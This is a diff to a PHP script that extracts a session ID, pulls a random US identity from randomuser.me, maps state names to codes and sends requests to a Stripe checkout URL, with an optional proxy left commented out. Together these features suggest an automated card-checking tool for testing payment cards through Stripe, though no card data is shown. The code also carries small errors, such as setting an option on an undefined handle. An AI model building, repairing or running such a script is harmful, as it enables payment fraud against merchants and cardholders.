@@ -28,7 +28,9 @@ function getSID(){
   $response = curl_exec($ch);
   //close the connection
   curl_close($ch);
-  return $response;
+  $pos = strpos($response, 'sessionId');
+  $sessionId = substr($response, $pos+12, -2);
+  return $sessionId;
 }
 
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
@@ -84,7 +86,6 @@ function mod($dividendo,$divisor)
     return round($dividendo - (floor($dividendo/$divisor)*$divisor));
 }
 
-$sessionId = getSID();
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -161,11 +162,15 @@ if($state=="Alabama"){ $state="AL";
 }else if($state=="wyoming"){ $state="WY";
 }else{$state="KY";} 
 
+
+# -------------------- [CREATE SESSION ID] -------------------#
+$sessionId = getSID();
+
 # -------------------- [1 REQ] -------------------#
 
 $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, '#');
+curl_setopt($ch, CURLOPT_URL, 'https://checkout.stripe.com/c/pay/'.$sessionId.'#fidkdWxOYHwnPyd1blppbHNgWnJCdkRWazFvYlFhUXdUVjRAZ2JKfz1MTzU1XW5uZ0FpR0wnKSdobGF2Jz9%2BJ2JwbGEnPyc9MGM0MWA2MSg3NDc9KDEwPDEoPGE0YCg2M2ZhNWAzNGRhYzY1NWNnYzEnKSdocGxhJz8nMzw8Nmc3M2EoNzc8MygxNT03KD1hZzQoMGZnMjYxPWA2NTU9MzxhNzM1JykndmxhJz8nM2MzMDI8ZzIoNWA1ZCgxZGQzKDw8NmQoYzFjYTM0MzZkM2FgYGY2Z2c1J3gpJ2dgcWR2Jz9eWCknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJyknd2BjYHd3YHdKd2xibGsnPydtcXF1dj8qKmJ3ZGR2dStgcCd4JSUl');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
